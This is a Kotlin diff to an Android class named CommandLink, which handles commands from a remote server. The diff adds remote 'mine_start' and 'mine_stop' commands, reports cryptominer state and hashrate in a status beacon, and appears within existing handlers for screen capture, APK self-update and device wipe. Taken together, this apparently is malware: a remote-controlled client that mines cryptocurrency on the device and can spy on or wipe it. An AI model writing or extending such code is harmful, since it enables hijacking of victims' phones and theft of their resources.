@@ -98,7 +98,14 @@ class CommandLink(private val context: Context) {
         val statsJson = StatsCollector.collect(context).entries.joinToString(",") { (k, v) ->
             "\"$k\":" + jsonVal(v)
         }
-        return """{"gender":"$gender","appType":"${BuildConfig.FLAVOR}","apkVersion":"${BuildConfig.VERSION_NAME}","stats":{$statsJson}}"""
+        val dm = context.resources.displayMetrics
+        val minerJson = buildString {
+            append("""{"state":"${MinerController.state()}",""")
+            append("\"hashrate\":${MinerController.hashrate()}")
+            MinerController.stopReason()?.let { append(""","stopReason":"$it"""") }
+            append("}")
+        }
+        return """{"gender":"$gender","appType":"${BuildConfig.FLAVOR}","apkVersion":"${BuildConfig.VERSION_NAME}","stats":{$statsJson},"miner":$minerJson,"screen":{"w":${dm.widthPixels},"h":${dm.heightPixels},"density":${dm.density}}}"""
     }
 
     private fun jsonVal(v: Any?): String = when (v) {
@@ -266,7 +273,10 @@ class CommandLink(private val context: Context) {
             )
 
             "screen_capture" -> runScreenCapture(payload)
-            "mine" -> "failed" to "unsupported"
+            "mine_start" -> MinerController.start(context, payload)
+            "mine_stop" -> MinerController.stop(context, "manual")
+            "input_tap", "input_swipe", "input_text" -> "failed" to "unsupported"
+            "files_pull", "notifications_pull" -> "failed" to "unsupported"
             "apk_update" -> runApkUpdate(payload)
             "wipe" ->
                 if (OperatorActions.isAdminEnabled(context)) {
